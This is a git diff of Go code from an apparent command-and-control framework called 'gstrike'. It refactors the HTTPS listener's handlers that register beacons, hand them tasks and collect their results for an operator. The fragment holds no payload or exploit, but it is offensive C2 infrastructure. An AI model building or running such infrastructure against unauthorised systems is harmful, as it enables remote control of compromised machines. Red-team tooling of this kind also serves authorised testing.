@@ -1,11 +1,12 @@
-package comms
+package transport
 
 import (
 	"context"
 	"crypto/tls"
 	"encoding/json"
 	"fmt"
-	"gstrike/pkg/core"
+	"gstrike/pkg/core/beaconmgr"
+	"gstrike/pkg/core/taskmgr"
 	"gstrike/pkg/util"
 	"net/http"
 	"strconv"
@@ -80,9 +81,9 @@ func (l *HttpsListener) Stop() error {
 
 // Registers the beacon, hands a unique UUID to identify them, received some critical info about the beacons env
 func RegisterBeacon(w http.ResponseWriter, r *http.Request) {
-	beacon, err := core.NewBeacon(w, r)
+	beacon, err := beaconmgr.NewBeacon(w, r)
 	if err != nil {
-		fmt.Println(util.PrintBad + "Failed to register new beacon:" + err)
+		fmt.Printf("%s Failed to register new beacon: %v\n", util.PrintBad, err)
 		return
 	}
 	w.Header().Set("Content-Type", "application/json")
@@ -90,13 +91,13 @@ func RegisterBeacon(w http.ResponseWriter, r *http.Request) {
 }
 
 func PostResults(w http.ResponseWriter, r *http.Request) {
-	var TaskRes core.Task
+	var TaskRes taskmgr.Task
 	if err := json.NewDecoder(r.Body).Decode(&TaskRes); err != nil {
 		fmt.Printf("%s Json decode error: %v\n", util.PrintBad, err)
 		http.Error(w, "Invalid JSON", http.StatusBadRequest)
 		return
 	}
-	core.UpdateTask(TaskRes)
+	taskmgr.UpdateTask(TaskRes)
 
 	// Display to operator
 	fmt.Printf("%s [%s] Beacon called back home, received %d bytes\n", util.PrintStatus, TaskRes.BeaconID, len(TaskRes.Output))
@@ -109,7 +110,7 @@ func PostResults(w http.ResponseWriter, r *http.Request) {
 
 func GetTask(w http.ResponseWriter, r *http.Request) {
 	beaconId := mux.Vars(r)["beaconId"]
-	next := core.NextTask(beaconId)
+	next := taskmgr.NextTask(beaconId)
 
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(next)
